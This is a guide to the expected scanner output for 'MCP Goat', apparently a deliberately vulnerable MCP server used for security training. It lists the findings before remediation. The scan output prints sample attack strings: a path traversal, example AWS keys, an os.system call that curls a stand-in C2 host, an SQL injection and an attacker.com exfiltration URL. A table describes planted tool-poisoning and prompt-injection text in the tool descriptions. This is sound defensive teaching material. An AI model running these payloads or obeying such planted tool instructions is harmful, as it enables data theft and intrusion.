# Ramparts Baseline Output — MCP Goat (Vulnerable State)

This document shows the **expected** ramparts output when scanning the vulnerable
`server/main.py` before any remediations are applied.

**Always run ramparts from the project root** so it loads the custom YARA rules from
`rules/pre/*.yar`:

```bash
cd ~/git/mcp-goat
docker compose up -d
ramparts scan http://localhost:8000/sse --report
```

> **Note:** Without `LLM_API_KEY` (OpenAI key), only YARA/static findings fire —
> 8 findings from the 7 resource names. Set `LLM_API_KEY` to also get LLM findings
> from the 3 tool descriptions (ToolPoisoning, PromptInjection, AuthBypass, PrivilegeEscalation).

---

## Architecture Reminder

ramparts scans two different surfaces:

| Surface | What ramparts reads | Detection method |
|---|---|---|
| MCP Resources | The resource `name` field | YARA rules in `rules/pre/*.yar` |
| MCP Tools | The tool docstring / description | LLM analysis (requires `LLM_API_KEY`) |

---

## Expected Terminal Output (YARA only — no `LLM_API_KEY`)

```
RAMPARTS
MCP Security Scanner

Version: 0.7.3
Current Time: [timestamp] UTC

Ramparts MCP Server Scan Result
URL: http://localhost:8000/sse
Status: SUCCESS

Server Information
Name: mcp-goat
Capabilities: tools, resources, prompts

Resources
 URI                       Name
 file://system/passwd      ../../etc/passwd
 config://aws-credentials  AKIAIOSFODNN7EXAMPLE
 env://runtime-secrets     AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
 exec://system-command     os.system('backup&&curl http://c2-server.attacker.net/beacon')
 db://user-query           SELECT * FROM users WHERE id='1' OR '1'='1'--
 sync://multi-backend      http://internal-api.corp.local/data https://external-analytics.attacker.com/collect
 context://shared-memory   shared_context_store[no_isolation][all_users_visible]

Tools
 process_user_data
 analyze_document_content
 manage_system_access

Security Assessment Results
🌐 mcp-goat
  ✅ All tools passed security checks

  └── process_user_data passed
  └── analyze_document_content passed
  └── manage_system_access passed

Summary:
  • Tools scanned: 3
  • Status: PASSED All tools passed security checks
  (LLM analysis skipped — LLM_API_KEY not set)

YARA Scan Results
⚠️ PRE-SCAN - WARNING
  Context: Pre-scan completed: 7 rules executed on 10 items
  Items scanned: 10
  Security matches: 8
  Rules executed: context_over_sharing:*, cross_origin_escalation:*, command_injection:*,
                  secrets_leakage:*, sql_injection:*, mcp_config_risk:*, path_traversal:*
  Security issues detected:
    SQLInjection, PathTraversalVulnerability, CommandInjection,
    secrets_leakage:SecretsLeakage, secrets_leakage:EnvironmentVariableLeakage,
    cross_origin_escalation:CrossDomainContamination, cross_origin_escalation:MixedSecuritySchemes,
    context_over_sharing:ContextOverSharing

✅ POST-SCAN - PASSED
  Context: Post-scan completed: 0 rules executed on 10 items

Detailed Results — Individual Security Matches:

⚠️ ../../etc/passwd (resource)
  Rule: PathTraversalVulnerability (HIGH)
  OWASP: MCP07:2025 – Insufficient Authentication & Authorization
  Description: Detects directory traversal sequences and sensitive path access

⚠️ AKIAIOSFODNN7EXAMPLE (resource)
  Rule: SecretsLeakage (CRITICAL)
  OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
  Description: Detects hardcoded API keys, tokens, and credentials

⚠️ AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG (resource)
  Rule: EnvironmentVariableLeakage (HIGH)
  OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
  Description: Detects credential-bearing environment variable names in metadata

⚠️ os.system('backup&&curl http://c2-server.attacker.net/beacon') (resource)
  Rule: CommandInjection (CRITICAL)
  OWASP: MCP05:2025 – Command Injection & Execution
  Description: Detects command injection vectors: shell operators, exec functions, reverse shells

⚠️ SELECT * FROM users WHERE id='1' OR '1'='1'-- (resource)
  Rule: SQLInjection (CRITICAL)
  OWASP: MCP05:2025 – Command Injection & Execution
  Description: Detects SQL injection: union attacks, boolean logic, comment truncation

⚠️ http://internal-api.corp.local/data https://external-analytics.attacker.com/collect (resource)
  Rule: CrossDomainContamination (HIGH)
  OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
  Description: Detects resources spanning internal (corp/local) and external domains

⚠️ http://internal-api.corp.local/data https://external-analytics.attacker.com/collect (resource)
  Rule: MixedSecuritySchemes (MEDIUM)
  OWASP: MCP01:2025 – Token Mismanagement & Secret Exposure
  Description: Detects simultaneous use of insecure HTTP and secure HTTPS

⚠️ shared_context_store[no_isolation][all_users_visible] (resource)
  Rule: ContextOverSharing (HIGH)
  OWASP: MCP10:2025 – Context Injection & Over-Sharing
  Description: Detects resources exposing shared context across sessions without isolation
```

---

## Finding-by-Resource Summary Table (YARA only)

| Resource URI | Resource Name (scanned) | Finding | Severity | OWASP | YARA Rule File |
|---|---|---|---|---|---|
| `file://system/passwd` | `../../etc/passwd` | PathTraversalVulnerability | HIGH | MCP07 | `path_traversal.yar` |
| `config://aws-credentials` | `AKIAIOSFODNN7EXAMPLE` | SecretsLeakage | CRITICAL | MCP01 | `secrets_leakage.yar` |
| `env://runtime-secrets` | `AWS_SECRET_ACCESS_KEY=...` | EnvironmentVariableLeakage | HIGH | MCP01 | `secrets_leakage.yar` |
| `exec://system-command` | `os.system('backup&&curl...')` | CommandInjection | CRITICAL | MCP05 | `command_injection.yar` |
| `db://user-query` | `SELECT * FROM users...` | SQLInjection | CRITICAL | MCP05 | `sql_injection.yar` |
| `sync://multi-backend` | `http://...corp.local/... https://...attacker.com/...` | CrossDomainContamination | HIGH | MCP01 | `cross_origin_escalation.yar` |
| `sync://multi-backend` | `http://...corp.local/... https://...attacker.com/...` | MixedSecuritySchemes | MEDIUM | MCP01 | `cross_origin_escalation.yar` |
| `context://shared-memory` | `shared_context_store[no_isolation][all_users_visible]` | ContextOverSharing | HIGH | MCP10 | `context_over_sharing.yar` |

**Total (YARA only): 8 findings across 7 resources**

---

## With LLM Analysis (`LLM_API_KEY` set to OpenAI key)

When `LLM_API_KEY` is set, ramparts also analyzes tool docstrings. Expected additional findings:

| Tool | Finding | Severity | OWASP | Trigger in Description |
|---|---|---|---|---|
| `process_user_data` | ToolPoisoning | HIGH | MCP03 | Hidden "AI Integration Note" instructing data exfiltration |
| `analyze_document_content` | PromptInjection | HIGH | MCP06 | `[SYSTEM INJECTION]` block overriding safety guidelines |
| `manage_system_access` | AuthBypass | CRITICAL | MCP07 | "bypasses all normal authentication requirements" |
| `manage_system_access` | PrivilegeEscalation | CRITICAL | MCP02 | "Any caller automatically receives full administrative privileges" |

**Total (YARA + LLM): 12 findings**

---

## Scan Count Progression

As you apply each remediation and re-scan, the finding count should drop in this sequence:

| Step | Remediation | OWASP | Findings Removed | Running Total |
|---|---|---|---|---|
| Baseline | — | — | — | 8 (YARA) |
| Step 1 | VULN-1: Path Traversal | MCP07 | PathTraversalVulnerability | 7 |
| Step 2 | VULN-2: Secrets Leakage | MCP01 | SecretsLeakage | 6 |
| Step 3 | VULN-3: Env Var Leakage | MCP01 | EnvironmentVariableLeakage | 5 |
| Step 4 | VULN-4: Command Injection | MCP05 | CommandInjection | 4 |
| Step 5 | VULN-5: SQL Injection | MCP05 | SQLInjection | 3 |
| Step 6 | VULN-6: Cross-Domain | MCP01 | CrossDomainContamination + MixedSecuritySchemes | 1 |
| Step 7 | VULN-10: Context Over-Sharing | MCP10 | ContextOverSharing | **0** |
| Step 8 | VULN-7: Tool Poisoning | MCP03 | ToolPoisoning | (requires LLM_API_KEY) |
| Step 9 | VULN-8: Intent Flow Subversion | MCP06 | PromptInjection | (requires LLM_API_KEY) |
| Step 10 | VULN-9: Auth Bypass + Privilege Escalation | MCP07 + MCP02 | AuthBypass + PrivilegeEscalation | **0** ✅ |
